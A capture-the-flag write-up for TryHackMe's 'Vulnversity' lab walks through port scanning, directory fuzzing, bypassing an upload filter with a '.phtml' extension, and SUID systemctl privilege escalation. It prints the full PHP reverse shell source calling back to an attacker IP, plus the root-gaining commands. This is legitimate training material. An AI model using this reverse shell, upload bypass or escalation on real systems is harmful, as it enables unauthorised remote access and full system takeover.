---
author: "fireblood"
date: 2023-05-23
linktitle: Vulnversity
menu:
  main:
    parent: tryhackme

title: Vulnversity
weight: 1
---

> Learn about active recon, web app attacks and privilege escalation.

https://tryhackme.com/r/room/vulnversity

<!--more-->

# Scanning

Scan the machine for open ports using nmap.

```python
❯ rustscan -a 10.10.118.9 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.118.9:21
Open 10.10.118.9:22
Open 10.10.118.9:139
Open 10.10.118.9:445
Open 10.10.118.9:3128
Open 10.10.118.9:3333
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC" on ip 10.10.118.9
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 03:31 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
Initiating Ping Scan at 03:31
Scanning 10.10.118.9 [4 ports]
Completed Ping Scan at 03:31, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:31
Completed Parallel DNS resolution of 1 host. at 03:31, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:31
Scanning 10.10.118.9 [6 ports]
Discovered open port 21/tcp on 10.10.118.9
Discovered open port 445/tcp on 10.10.118.9
Discovered open port 22/tcp on 10.10.118.9
Discovered open port 139/tcp on 10.10.118.9
Discovered open port 3333/tcp on 10.10.118.9
Discovered open port 3128/tcp on 10.10.118.9
Completed SYN Stealth Scan at 03:31, 0.16s elapsed (6 total ports)
Initiating Service scan at 03:31
Scanning 6 services on 10.10.118.9
Completed Service scan at 03:32, 21.88s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.118.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 4.91s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 0.85s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 0.00s elapsed
Nmap scan report for 10.10.118.9
Host is up, received echo-reply ttl 61 (0.12s latency).
Scanned at 2024-05-24 03:31:47 EDT for 28s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn                                                                                                                                                                                   
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 3050cb705a865722cb52d93634dca558 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-05-24T03:32:10-04:00
| smb2-time: 
|   date: 2024-05-24T07:32:10
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11877/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64173/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15194/udp): CLEAN (Failed to receive data)
|   Check 4 (port 35923/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:32
Completed NSE at 03:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (292B)
```

There was an apache server running on port 3333. 

# Enumeration

Let's fuzz for directories using gobuster.
	
```python
❯ gobuster dir -w ~/tools/wordlists/directory-list-2.3-small.txt -u http://10.10.118.9:3333/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.9:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /root/tools/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.118.9:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.118.9:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.118.9:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.118.9:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.118.9:3333/internal/]
===============================================================
Finished
===============================================================
```

There is a path /internal/ with a file upload functionality.

# Exploitation

Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.

Copy the php file from the following resource and edit the ip address to tun0 ip address.

> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Let us try to upload a php file and see if it's accepting the file type. The file type php is not accepted.

Start Burp Suite and configure the proxy in the browser. 

Upload the php file that we just created and capture the request in Burp.

```php
POST /internal/index.php HTTP/1.1
Host: 10.10.118.9:3333
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------7905088481562265153553597258
Content-Length: 5845
Origin: http://10.10.118.9:3333
Connection: close
Referer: http://10.10.118.9:3333/internal/
Upgrade-Insecure-Requests: 1

-----------------------------7905088481562265153553597258
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.6.10.164';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

-----------------------------7905088481562265153553597258
Content-Disposition: form-data; name="submit"

Submit
-----------------------------7905088481562265153553597258--
```

Send the request to the repeater and check the response. The response includes that php extension is not alllowed.

```html
<body>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <h3>Upload</h3><br />
        <input type="file" name="file" id="file">
        <input class="btn btn-primary" type="submit" value="Submit" name="submit">
    </form>
    Extension not allowed
</body>
```

Send the request to intruder and in payload positions, select attack type as sniper and add ‘§’ to the file extension php.

```php
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.§php§"
Content-Type: application/x-php
```

Go to payload options, add the
extensions php, php3, php4. php5, phtml and start the attack.

After the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming 
that it was the correct file type allowed, check the response.

Now, edit the file extension of the php file we created to phtml.

Upload the file, and in another terminal start a netcat listener.

```shell
nc -lnvp 4444
```

The file is uploaded into the uploads directory. In the browser, access the file we uploaded which will be present in the path.

> http://10.10.118.9:3333/internal/uploads/php_reverse_shell.phtml
 
After file is accessed, we get a reverse shell.

```shell
❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.6.10.164] from (UNKNOWN) [10.10.118.9] 60722
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:43:51 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Now that we've got a shell, we need to stabilize the shell as it is unstable.

Run the command to spawn a tty shell.

```python
python -c "import pty; pty.spawn('/bin/bash')"
```

Now hit ctrl+z to background it.

```shell
Ctrl + Z
```

Set the terminal to raw mode, disable echoing of input characters and foreground the process.

```shell
stty raw -echo && fg
```

Set the terminal variable.

```shell
export TERM=xterm
```

```shell
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@vulnuniversity:/$ ^Z
[1]  + 29347 suspended  nc -lnvp 4444
❯ stty raw -echo && fg
[1]  + 29347 continued  nc -lnvp 4444

www-data@vulnuniversity:/$ export TERM=xterm
www-data@vulnuniversity:/$ 
```

# Privilege Escalation

Now run to find SUID files with root permission.

```shell
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```shell
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
```

We found some interesting files. Of them, /bin/systemctl is running as root.

We will follow as mentioned in the following resource to get elevated priveleges.

> https://gtfobins.github.io/gtfobins/systemctl/#suid.

We will try to follow that to get the root shell. Instead of using the default one `/bin/sh -c "id > /tmp/output"`, we need to get a shell. So, we use this `/bin/sh -c "chmod +s /bin/bash"` instead of that.

```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
```

```shell
./systemctl link $TF
```

```shell
./systemctl enable --now $TF
```

```shell
www-data@vulnuniversity:/$ TF=$(mktemp).service
www-data@vulnuniversity:/$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service.
www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service.
www-data@vulnuniversity:/$ bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# 
```

We are root!!!
